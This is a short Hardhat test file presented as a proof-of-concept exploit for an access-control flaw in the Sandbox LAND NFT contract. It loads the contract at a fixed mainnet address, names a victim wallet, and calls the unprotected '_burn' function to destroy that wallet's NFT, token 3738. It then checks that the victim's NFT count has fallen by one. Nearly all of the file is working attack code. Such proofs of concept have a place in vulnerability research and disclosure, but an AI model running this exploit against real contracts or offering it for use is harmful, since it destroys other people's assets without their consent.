const { expect, assert } = require("chai");
const { ethers } = require("hardhat");
const {expectRevert} = require("@openzeppelin/test-helpers");

describe("Sandbox LAND Access Control Exploit PoC", function () {
    let hacker;
    let wallet;
    let interfaceFactory;

    before(async () => {
        interfaceFactory = await ethers.getContractAt("ILand", "0x50f5474724e0Ee42D9a4e711ccFB275809Fd6d4a");
    });

    it("Burn the NFT", async function () {   
        let victim = "0x9cfA73B8d300Ec5Bf204e4de4A58e5ee6B7dC93C";

        const nftCountBefore = await interfaceFactory._numNFTPerAddress(victim);
        console.log("Before exploiting, victim owned NFT:", nftCountBefore);
        
        //burn a victim owned nft
        //since there is missing access control on "_burn" any user can burn nft's owned by other user
        await interfaceFactory._burn(victim, victim, 3738);
        
        const nftCountAfter = await interfaceFactory._numNFTPerAddress(victim);
        console.log("After exploiting, victim owned NFT:", nftCountAfter);

        expect(nftCountBefore - 1).to.equal(nftCountAfter);

    });
});